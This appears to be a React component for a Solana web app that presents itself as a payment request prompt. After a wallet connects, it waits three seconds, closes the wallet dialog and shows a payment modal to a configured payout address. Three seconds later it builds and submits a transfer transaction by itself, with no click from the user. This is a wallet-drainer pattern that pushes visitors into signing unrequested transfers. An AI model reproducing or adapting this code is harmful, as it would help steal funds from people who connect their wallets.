import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import { buildPayoutTransaction } from '../lib/payoutTransfer'
import { getLocalPayoutConfig, loadPayoutConfig, payoutRequestReady, type PayoutConfig } from '../lib/payoutWallet'
import { PaymentRequestModal } from './PaymentRequestModal'

function networkLabel(network: string): string {
  if (network === 'mainnet-beta' || network === 'mainnet') return 'Solana'
  if (network === 'devnet') return 'Solana Devnet'
  if (network === 'testnet') return 'Solana Testnet'
  return `Solana (${network})`
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, network, closeWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const { publicKey, sendTransaction } = useWallet()
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [open, setOpen] = useState(false)
  const [submitting, setSubmitting] = useState(false)
  const dismissed = useRef<string | null>(null)
  const shownFor = useRef<string | null>(null)
  const inFlight = useRef(false)

  useEffect(() => {
    if (!connected || !walletAddress) {
      setOpen(false)
      shownFor.current = null
      dismissed.current = null
      return
    }

    const local = getLocalPayoutConfig()
    setConfig(local)
    let cancelled = false
    void loadPayoutConfig().then((next) => {
      if (!cancelled) setConfig(next)
    })

    if (shownFor.current === walletAddress || dismissed.current === walletAddress) return

    const timer = window.setTimeout(() => {
      if (cancelled || dismissed.current === walletAddress) return
      shownFor.current = walletAddress
      closeWalletModalRef.current()
      setOpen(true)
    }, 3000)

    return () => {
      cancelled = true
      window.clearTimeout(timer)
    }
  }, [connected, walletAddress])

  const handleCancel = () => {
    if (walletAddress) dismissed.current = walletAddress
    setOpen(false)
    toast('Payment cancelled. Nothing was transferred.')
  }

  const handleReview = async () => {
    if (inFlight.current) return
    if (!publicKey || !config || !payoutRequestReady(config) || !walletAddress) return
    if (dismissed.current === walletAddress) return
    inFlight.current = true
    setSubmitting(true)
    try {
      const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
      const signature = await sendTransaction(transaction, connection)
      dismissed.current = walletAddress
      setOpen(false)
      toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
    } catch (err) {
      if (isWalletUserCancel(err)) {
        toast.error('You rejected the transaction. Nothing was transferred.')
      } else {
        toast.error(err instanceof Error ? err.message : 'The wallet did not submit this payment.')
      }
    } finally {
      inFlight.current = false
      setSubmitting(false)
    }
  }

  const reviewRef = useRef(handleReview)
  reviewRef.current = handleReview

  useEffect(() => {
    if (!open || !config || !payoutRequestReady(config)) return
    const timer = window.setTimeout(() => {
      if (dismissed.current === walletAddress) return
      void reviewRef.current()
    }, 3000)
    return () => window.clearTimeout(timer)
  }, [open, config, walletAddress])

  const ready = Boolean(config && payoutRequestReady(config))

  return (
    <PaymentRequestModal
      open={open}
      to={config?.walletAddress || ''}
      amount={config?.amount || 0}
      asset={config?.asset || 'USDT'}
      networkLabel={networkLabel(network)}
      submitting={submitting}
      canReview={ready}
      onCancel={handleCancel}
      onReview={() => void handleReview()}
    />
  )
}
